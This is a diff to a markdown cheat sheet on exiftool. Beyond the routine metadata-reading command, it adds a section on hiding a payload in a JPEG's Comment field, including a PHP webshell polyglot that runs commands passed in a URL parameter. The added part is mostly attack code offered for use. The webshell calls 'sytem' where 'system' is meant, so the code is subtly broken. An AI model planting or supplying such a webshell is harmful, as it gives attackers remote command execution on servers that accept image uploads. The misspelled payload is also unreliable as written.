@@ -19,3 +19,17 @@ sudo apt install libimage-exiftool-perl
 ```bash
 exiftool $FILE_PATH
 ```
+
+---
+
+## Embed a Payload within an Image's Metadata
+
+```bash
+exiftool -Comment="$PAYLOAD;" img.jpg
+```
+
+Example PHAR/JPEG webshell polyglot:
+
+```bash
+exiftool -Comment="<?php echo 'OUTPUT-BEGIN:'; echo sytem($_GET['cmd']); echo ':OUTPUT-END'; __halt_compiler();" img.jpg
+```
